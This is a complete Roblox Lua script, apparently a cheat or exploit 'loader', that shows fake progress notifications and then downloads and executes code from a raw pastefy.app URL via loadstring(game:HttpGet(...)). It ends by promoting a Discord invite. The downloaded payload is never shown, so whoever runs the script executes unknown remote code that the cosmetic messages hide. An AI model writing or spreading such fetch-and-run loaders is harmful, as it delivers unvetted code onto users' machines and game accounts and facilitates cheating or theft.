local NotificationService = game:GetService("StarterGui")
local DISCORD_LINK = "https://discord.gg/9TsskpXX"
local SCRIPT_URL = "https://pastefy.app/OKqn6NVq/raw"
local function notify(title, text, duration)
    NotificationService:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 3
    })
end

notify("Unreal Loader", "Initializing...", 1.5)
wait(1.5)
notify("Loading", "Preparing assets...", 1.5)
wait(1.5)
notify("Download", "Fetching script...", 1.5)
wait(1.5)
local success = pcall(function()
    loadstring(game:HttpGet(SCRIPT_URL))()
end)
if success then
    notify("Success", "Script loaded successfully", 2)
    wait(1)
    notify("Discord", "Join us: " .. DISCORD_LINK, 5)
else
    notify("Error", "Failed to load script", 3)
end